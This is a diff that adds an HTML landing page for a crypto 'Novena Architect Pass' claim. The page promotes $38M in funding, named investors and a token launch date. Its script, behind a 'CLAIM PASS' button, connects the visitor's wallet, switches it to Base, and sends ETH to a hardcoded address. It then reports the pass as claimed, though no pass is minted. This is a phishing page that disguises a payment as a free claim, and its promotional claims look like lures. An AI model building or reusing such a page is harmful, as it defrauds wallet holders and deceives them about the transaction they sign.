@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Novena Architect — Architect Pass</title>
+<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@500;800&family=Sora:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+:root{color-scheme:dark;--bg:#07040f;--text:#f2eeff;--muted:#a79fc4;--card:rgba(20,12,40,.55);--line:rgba(255,255,255,.12);--n1:#00f5d4;--n2:#9b5cff;--n3:#ff3df2;--n4:#ffe14d;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font-family:'Sora',system-ui,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+.bg{position:fixed;inset:0;z-index:-1;background:linear-gradient(120deg,#07040f,#1a0b3d,#06222b,#2a0a3a,#07040f);background-size:400% 400%;animation:flow 14s ease infinite}
+.bg::before,.bg::after{content:"";position:absolute;width:60vmax;height:60vmax;border-radius:50%;filter:blur(90px);opacity:.35;animation:float 18s ease-in-out infinite}
+.bg::before{background:var(--n2);top:-20vmax;left:-15vmax}
+.bg::after{background:var(--n1);bottom:-25vmax;right:-15vmax;animation-delay:-9s}
+@keyframes flow{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}
+@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(8vmax,6vmax) scale(1.2)}}
+@keyframes hue{to{filter:hue-rotate(360deg)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+.wrap{max-width:760px;margin:0 auto;padding:28px 20px 60px}
+nav{display:flex;justify-content:space-between;align-items:center;margin-bottom:34px}
+.logo{font-family:'Unbounded';font-weight:800;letter-spacing:.14em;font-size:14px;text-shadow:0 0 12px var(--n1)}
+.chip{font-size:12px;padding:7px 14px;border:1px solid var(--line);border-radius:99px;background:var(--card);color:var(--muted);backdrop-filter:blur(8px)}
+h1{font-family:'Unbounded';font-weight:800;font-size:clamp(34px,9vw,64px);line-height:1.05;margin:0 0 14px;background:linear-gradient(90deg,var(--n1),var(--n2),var(--n3),var(--n4),var(--n1));background-size:300% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:flow 6s linear infinite;filter:drop-shadow(0 0 18px rgba(155,92,255,.5))}
+.sub{color:var(--muted);font-weight:300;font-size:16px;line-height:1.7;margin:0 0 30px}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:26px}
+.stat{padding:16px;border-radius:16px;background:var(--card);border:1px solid var(--line);backdrop-filter:blur(10px)}
+.stat b{display:block;font-family:'Unbounded';font-size:22px;color:var(--n1);text-shadow:0 0 14px var(--n1)}
+.stat span{font-size:12px;color:var(--muted)}
+.claim{position:relative;padding:3px;border-radius:26px;margin-bottom:30px;background:conic-gradient(from 0deg,var(--n1),var(--n2),var(--n3),var(--n4),var(--n1));box-shadow:0 0 40px rgba(155,92,255,.45),0 0 90px rgba(0,245,212,.2);animation:hue 10s linear infinite}
+.claim-in{border-radius:23px;background:#0b0618;padding:34px 24px;text-align:center}
+.pass{width:150px;height:150px;margin:0 auto 20px;border-radius:36px;display:grid;place-items:center;background:radial-gradient(circle at 50% 40%,#1d1040,#09051a 70%);border:1px solid rgba(155,92,255,.55);box-shadow:0 0 34px rgba(155,92,255,.55),0 0 70px rgba(0,245,212,.25),inset 0 0 30px rgba(155,92,255,.25)}
+.pass svg{width:104px;height:104px;filter:drop-shadow(0 0 8px var(--n1)) drop-shadow(0 0 18px var(--n3));animation:pulse 3.5s ease-in-out infinite}
+@keyframes pulse{50%{transform:scale(1.07);filter:drop-shadow(0 0 12px var(--n3)) drop-shadow(0 0 26px var(--n1))}}
+.claim h2{font-family:'Unbounded';font-weight:500;font-size:20px;margin:0 0 6px}
+.claim p{color:var(--muted);font-size:14px;margin:0 0 22px}
+button{font-family:'Unbounded';font-weight:800;font-size:15px;letter-spacing:.08em;color:#07040f;border:0;border-radius:16px;padding:18px 34px;width:100%;max-width:340px;cursor:pointer;background:linear-gradient(90deg,var(--n1),var(--n4),var(--n3),var(--n1));background-size:300% 100%;animation:flow 4s linear infinite;box-shadow:0 0 22px var(--n1),0 0 48px rgba(255,61,242,.45);transition:transform .15s}
+button:hover{transform:translateY(-2px) scale(1.02)}
+button:disabled{opacity:.6;cursor:wait}
+#status{min-height:22px;margin-top:16px;font-size:13px;color:var(--muted);word-break:break-all}
+#status.ok{color:var(--n1);text-shadow:0 0 10px var(--n1)}
+#status.err{color:#ff6b8a}
+.card{padding:24px;border-radius:20px;background:var(--card);border:1px solid var(--line);backdrop-filter:blur(10px);margin-bottom:16px}
+.card h3{font-family:'Unbounded';font-weight:500;font-size:17px;margin:0 0 12px;color:var(--n3);text-shadow:0 0 12px rgba(255,61,242,.6)}
+.card p,.card li{color:var(--muted);font-size:14.5px;line-height:1.7;font-weight:300}
+.card ul{margin:0;padding-left:20px}
+.card li::marker{color:var(--n1)}
+.inv{display:flex;flex-wrap:wrap;gap:8px;margin-top:6px}
+.inv span{padding:8px 14px;border-radius:99px;font-size:13px;border:1px solid var(--n2);color:var(--text);box-shadow:0 0 12px rgba(155,92,255,.4)}
+.soon{display:flex;gap:12px;flex-wrap:wrap}
+.soon div{flex:1;min-width:200px}
+.soon b{display:block;font-family:'Unbounded';font-size:15px;color:var(--n4);text-shadow:0 0 12px rgba(255,225,77,.6);margin-top:4px}
+footer{text-align:center;color:var(--muted);font-size:12px;margin-top:30px}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="wrap">
+  <nav><div class="logo">NOVENA</div><div class="chip" id="net">Base Mainnet</div></nav>
+
+  <h1>Novena Architect</h1>
+  <p class="sub">Novena Architect is a builder-first onchain ecosystem backed by $38M in funding. It gives creators, developers and early believers the tools, access and ownership to shape the network from day one.</p>
+
+  <div class="stats">
+    <div class="stat"><b>$38M</b><span>Funds raised</span></div>
+    <div class="stat"><b>Base</b><span>Claim network</span></div>
+    <div class="stat"><b>17 Dec</b><span>TGE</span></div>
+  </div>
+
+  <div class="claim"><div class="claim-in">
+    <div class="pass"><svg viewBox="0 0 100 100" aria-label="Novena Architect logo"><defs><linearGradient id="lg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#00f5d4"/><stop offset=".5" stop-color="#9b5cff"/><stop offset="1" stop-color="#ff3df2"/><animateTransform attributeName="gradientTransform" type="rotate" from="0 .5 .5" to="360 .5 .5" dur="6s" repeatCount="indefinite"/></linearGradient></defs><polygon points="50,5 89,27.5 89,72.5 50,95 11,72.5 11,27.5" fill="none" stroke="url(#lg)" stroke-width="3.5" stroke-linejoin="round"/><polygon points="50,17 78.5,33.5 78.5,66.5 50,83 21.5,66.5 21.5,33.5" fill="none" stroke="url(#lg)" stroke-width="1" opacity=".45" stroke-linejoin="round"/><path d="M35 69V31L65 69V31" fill="none" stroke="url(#lg)" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/><circle cx="50" cy="5" r="3.2" fill="#ffe14d"/><circle cx="50" cy="95" r="3.2" fill="#00f5d4"/><circle cx="89" cy="27.5" r="2.4" fill="#ff3df2"/><circle cx="11" cy="72.5" r="2.4" fill="#ff3df2"/></svg></div>
+    <h2>Novena Architect Pass</h2>
+    <p>Your key to the Novena Architect ecosystem.</p>
+    <button id="btn">CLAIM PASS</button>
+    <div id="status"></div>
+  </div></div>
+
+  <div class="card">
+    <h3>Backed by the best</h3>
+    <p>$38M raised, led by:</p>
+    <div class="inv"><span>a16z Crypto</span><span>KuCoin Labs</span><span>Bybit</span><span>DAO Space</span></div>
+  </div>
+
+  <div class="card">
+    <h3>Why claim the Architect Pass?</h3>
+    <ul>
+      <li>Early, priority access to the Novena Architect ecosystem and upcoming launches.</li>
+      <li>Recognition as a founding Architect: an onchain identity that proves you were here first.</li>
+      <li>Eligibility for future rewards, campaigns and community perks tied to the Pass.</li>
+      <li>A voice in how the network grows, through community participation and governance opportunities.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h3>Tokenomics</h3>
+    <div class="soon">
+      <div><span style="color:var(--muted);font-size:13px">Details</span><b>Coming soon</b></div>
+      <div><span style="color:var(--muted);font-size:13px">TGE</span><b>17th December</b></div>
+    </div>
+  </div>
+
+  <footer>© Novena Architect</footer>
+</div>
+
+<script>
+(function(){
+  var RECEIVER="0x151b8112E1eB5f945e5F389ED1e108201D33E10c";
+  var VALUE="0x"+(111000000000000n).toString(16);
+  var BASE="0x2105";
+  var btn=document.getElementById("btn"),st=document.getElementById("status");
+  function say(t,c){st.textContent=t;st.className=c||""}
+  async function toBase(eth){
+    try{await eth.request({method:"wallet_switchEthereumChain",params:[{chainId:BASE}]})}
+    catch(e){
+      if(e&&(e.code===4902||e.code===-32603)){
+        await eth.request({method:"wallet_addEthereumChain",params:[{chainId:BASE,chainName:"Base Mainnet",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:["https://mainnet.base.org"],blockExplorerUrls:["https://basescan.org"]}]});
+      }else throw e;
+    }
+  }
+  btn.addEventListener("click",async function(){
+    var eth=window.ethereum;
+    if(!eth){say("No wallet found. Open this page in a wallet browser or install a wallet extension.","err");return}
+    btn.disabled=true;
+    try{
+      say("Connecting wallet…");
+      var acc=await eth.request({method:"eth_requestAccounts"});
+      say("Switching to Base Mainnet…");
+      await toBase(eth);
+      say("Confirm the claim in your wallet…");
+      var tx=await eth.request({method:"eth_sendTransaction",params:[{from:acc[0],to:RECEIVER,value:VALUE}]});
+      say("Claim submitted ✓  "+tx,"ok");
+      btn.textContent="PASS CLAIMED";
+    }catch(e){
+      say((e&&e.code===4001)?"Request cancelled.":"Something went wrong. Please try again.","err");
+      btn.disabled=false;
+    }
+  });
+})();
+</script>
+</body>
+</html>
